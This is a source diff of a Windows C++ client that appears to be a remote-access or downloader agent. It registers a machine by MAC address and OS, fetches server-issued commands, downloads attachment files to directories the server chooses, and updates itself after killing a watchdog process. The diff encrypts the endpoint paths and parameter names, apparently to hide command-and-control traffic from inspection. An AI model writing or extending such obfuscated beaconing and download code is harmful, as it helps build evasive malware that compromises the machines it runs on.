@@ -2,6 +2,8 @@
 #include "Connection.h"
 #include "Tools.h"
 #include "ActiveAgent.h"
+#include "Encrypt.h"
+
 using namespace std;
 
 Connection::Connection(wstring src)
@@ -18,19 +20,41 @@ pplx::task<int> Connection::GetClientData()
 	http_request getRequest;
 	getRequest.set_method(methods::GET);
 
-#if !_MOD_PROD
+#if _MOD_DEV
 	Tools::WriteLog(L"GetClientData");
 #endif
+	wstring uri;
+	uri += L"/";
+	uri += Encrypt::DecryptVariable(_URL_CLIENTS_PATH);
+	uri += L"/";
+	uri += Encrypt::DecryptVariable(_URL_CLIENT_PATH);
+	uri += L"?";
+	uri += Encrypt::DecryptVariable(_URL_ARGS_MAC_ADDRESS);
+	uri += L"=";
+	uri += Tools::GetMAC();
+	uri += L"&";
+	uri += Encrypt::DecryptVariable(_URL_ARGS_AGENT_ID);
+	uri += L"=";
+	uri += std::to_wstring(agent_id);
+	uri += L"&";
+	uri += Encrypt::DecryptVariable(_URL_ARGS_AGENT_FILE_VERSION);
+	uri += L"=";
+	uri += std::to_wstring(agent_file_version);
+	uri += L"&";
+	uri += Encrypt::DecryptVariable(_URL_ARGS_COUNTER);
+	uri += L"=";
+	uri += std::to_wstring(counter);
 
-	wstring uri =
+	Tools::WriteLog(uri);
+	/*wstring uri =
 		L"/clients/client?mac_address=" + Tools::GetMAC() +
 		L"&agent_id=" + std::to_wstring(agent_id) +
 		L"&agent_file_version=" + std::to_wstring(agent_file_version) +
-		L"&counter=" + std::to_wstring(counter);
+		L"&counter=" + std::to_wstring(counter);*/
 
 	counter++;
 
-#if !_MOD_PROD
+#if _MOD_DEV
 	Tools::WriteLog(L"URL: " + uri);
 #endif
 
@@ -83,21 +107,27 @@ pplx::task<int> Connection::GetClientData()
 
 pplx::task<int> Connection::PostClientData()
 {
-#if !_MOD_PROD
+#if _MOD_DEV
 	Tools::WriteLog(L"Starting POST");
 #endif
 	http_client client(source);
 	http_request postRequest;
-	postRequest.set_request_uri(L"/clients/create");
+	wstring uri;
+	uri += L"/";
+	uri += Encrypt::DecryptVariable(_URL_CLIENTS_PATH);
+	uri += L"/";
+	uri += Encrypt::DecryptVariable(_URL_CREATE_PATH);
+
+	postRequest.set_request_uri(uri);
 	postRequest.set_method(methods::POST);
 
 	web::json::value postData;
 
-	postData[L"mac_address"] = json::value::string(Tools::GetMAC());
-	postData[L"agent_id"] = json::value::string(std::to_wstring(agent_id));
-	postData[L"agent_file_version"] = json::value::string(std::to_wstring(agent_file_version));
-	postData[L"os"] = json::value::string(L"Windows");
-	postData[L"os_version"] = json::value::string(Tools::OsVersion().c_str());
+	postData[Encrypt::DecryptVariable(_URL_ARGS_MAC_ADDRESS)] = json::value::string(Tools::GetMAC());
+	postData[Encrypt::DecryptVariable(_URL_ARGS_AGENT_ID)] = json::value::string(std::to_wstring(agent_id));
+	postData[Encrypt::DecryptVariable(_URL_ARGS_AGENT_FILE_VERSION)] = json::value::string(std::to_wstring(agent_file_version));
+	postData[Encrypt::DecryptVariable(_URL_ARGS_OS)] = json::value::string(L"Windows");
+	postData[Encrypt::DecryptVariable(_URL_ARGS_OS_VERSION)] = json::value::string(Tools::OsVersion().c_str());
 
 	postRequest.set_body(postData);
 
@@ -141,15 +171,15 @@ bool Connection::DoCommands(web::json::array Commands) {
 		auto directory = data.at(U("directory")).as_string();
 		auto attachments = data.at(U("attachments")).as_array();
 
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Command");
 #endif
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(std::to_wstring(id));
 #endif
 
 #if !__DEBUG
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Getting Attachments");
 #endif
 #if _ENABLE_GetAttachments
@@ -173,7 +203,7 @@ bool Connection::GetAttachments(web::json::array Attachments) {
 		auto directory = data.at(U("directory")).as_string();
 		wstring file_path = directory + L"\\" + public_name;
 
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Attachment" + url);
 #endif
 		Tools::DownloadFile(url, file_path);
@@ -195,45 +225,42 @@ bool Connection::CheckAgent(web::json::object Agent) {
 	auto file_version = File.at(U("version")).as_integer();
 	auto file_url = File.at(U("url")).as_string();
 
-#if !_MOD_PROD
+#if _MOD_DEV
 	Tools::WriteLog(L"Yor agent id = " + std::to_wstring(agent_id));
 #endif
-#if !_MOD_PROD
+#if _MOD_DEV
 	Tools::WriteLog(L"Yor agent version = " + std::to_wstring(agent_file_version));
 #endif
-#if !_MOD_PROD
+#if _MOD_DEV
 	Tools::WriteLog(L"Last agent version = " + std::to_wstring(file_version));
 #endif
 
 	auto currentExePath = Tools::getExePath();
 
 	if ((currentExePath == file_path && id == agent_id && file_version == agent_file_version)) {
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Agent is last version.");
 #endif
 		Tools::createLink(file_path.c_str(), public_name.c_str());
 	}
 	else {
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Updating Agent");
 #endif
 
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Terminating RunKeeper");
 #endif
-
-
 		UpdateTime = true;
-
 		HANDLE runKeeperHnd = RunKeeperExecInfo.hProcess;
 		TerminateProcess(runKeeperHnd, 1);
 		WaitForSingleObject(runKeeperHnd, INFINITE);
 
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Terminating RunKeeper: Done");
 #endif
 
-#if !_MOD_PROD
+#if _MOD_DEV
 		Tools::WriteLog(L"Running Updater and terminating old!");
 #endif
 
